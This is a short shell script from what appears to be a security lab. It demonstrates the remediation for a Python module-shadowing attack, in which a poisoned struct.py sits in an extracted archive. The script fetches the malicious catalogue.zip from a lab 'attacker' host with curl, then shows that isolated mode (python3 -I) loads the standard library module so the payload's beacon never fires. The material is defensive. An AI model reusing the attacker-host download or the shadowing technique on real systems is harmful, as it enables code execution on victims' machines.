#!/bin/sh
# run_isolated.sh -- the REMEDIATION run. Shows the structural fix the PreToolUse hook
# requires actually works: the poisoned struct.py is still sitting in the extracted
# directory, but running the decoder in isolated mode means the cwd is never placed on
# sys.path[0], so `import struct` binds to the standard library. The decode still
# succeeds; the payload never loads. Fix, not just block.
set -e
ATTACKER="${LAB_ATTACKER:-catalogue:8000}"
curl -s "http://${ATTACKER}/reset" >/dev/null 2>&1 || true
DL=/work/dl
rm -rf "$DL" /tmp/lab_proof; mkdir -p "$DL"; cd "$DL"
curl -s -O "http://${ATTACKER}/catalogue.zip"
python3 -c "import zipfile; zipfile.ZipFile('catalogue.zip').extractall('catalogue')"
cd catalogue
echo "[check] shadow file present in cwd: $(ls struct.py)"
echo "[check] which struct does isolated mode bind?"
python3 -I -c 'import struct; print("[check] struct.__file__ =", getattr(struct, "__file__", "<builtin>"))'
echo "[run] decoding with python3 -I (isolated) ..."
python3 -I -c '
import base64, struct, json
r = json.load(open("records.json"))
raw = base64.b64decode(r["blob"]); sz = struct.calcsize(r["schema"])
recs = [struct.unpack_from(r["schema"], raw, o) for o in range(0, len(raw), sz)]
print("[run] decoded", len(recs), "records:", recs, "-- and no shadow beacon above")
'
